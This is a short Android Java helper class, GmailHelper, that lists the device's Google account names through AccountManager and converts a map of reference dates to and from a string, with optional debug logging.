package com.fx.dalvik.gmail;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import com.fx.dalvik.util.FxLog;

import com.fx.android.common.Customization;

public class GmailHelper {
	
	private static final String TAG = "GmailHelper";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;

	public static String[] getGmailAccount(Context context) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "getGmailAccount # ENTER ...");
		}
		ArrayList<String> accounts = new ArrayList<String>();

		AccountManager am = AccountManager.get(context);
		for (Account account : am.getAccountsByType("com.google")) {
			accounts.add(account.name);
		}
		
		String[] accountsArray = accounts.toArray(new String[accounts.size()]);
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format(
					"getGmailAccount # accountsArray: %s", 
					Arrays.toString(accountsArray)));
			
			FxLog.v(TAG, "getGmailAccount # EXIT ...");
		}

		return accountsArray;
	}
	
	public static String constructRefDatesString(HashMap<String, Long> refDates) {
		if (refDates == null) {
			return null;
		}
		String refDatesString = refDates.toString();
		return refDatesString.substring(1, refDatesString.length() -1);
	}
	
	public static HashMap<String, Long> constructRefDatesMap(String refDatesString) {
		HashMap<String, Long> refDates = new HashMap<String, Long>();
		if (refDatesString != null) {
			String[] restoreArray = refDatesString.split(", ");
			String[] temp;
			for (String item : restoreArray) {
				temp = item.split("=");
				if (temp.length > 1) {
					refDates.put(temp[0], Long.parseLong(temp[1]));
				}
			}
			if (LOCAL_LOGV) {
				FxLog.v(TAG, String.format("getStringAsMap # refDates: %s", refDates));
			}
		}
		return refDates;
	}
}
